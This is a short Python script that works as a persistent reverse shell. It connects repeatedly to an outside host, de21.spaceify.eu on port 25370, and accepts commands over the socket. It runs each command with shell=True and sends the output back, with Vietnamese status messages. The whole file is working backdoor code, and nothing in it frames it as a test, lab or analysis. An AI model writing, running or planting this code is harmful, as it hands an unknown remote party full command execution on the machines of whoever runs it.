import socket
import subprocess
import time
host = "de21.spaceify.eu"
port = 25370
def connect():
    while True:
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect((host, port))
            return client
        except:
            print("❌ Không kết nối được, thử lại sau 3s...")
            time.sleep(5)

while True:
    client = connect()
    try:
        while True:
            cmd = client.recv(1024).decode()
            if not cmd or cmd.lower() == "exit":
                break
            try:
                output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
            except Exception as e:
                output = str(e).encode()
            client.send(output)
    except Exception as e:
        print("Mất kết nối:", e)
    finally:
        client.close()


